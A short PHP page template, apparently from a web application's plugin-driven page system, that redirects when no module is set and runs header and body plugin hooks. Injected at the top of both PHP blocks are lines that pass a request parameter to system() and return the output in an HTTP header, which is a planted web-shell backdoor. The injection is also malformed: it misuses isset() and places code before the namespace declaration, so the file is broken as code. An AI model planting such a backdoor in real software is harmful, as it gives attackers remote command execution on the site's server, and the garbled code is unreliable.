<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

if ($url->get_module() == '') {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$plugins->run('simple_page_header_' . $url->get_module());

?>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $plugins->run('simple_page_body_' . $url->get_module()); ?>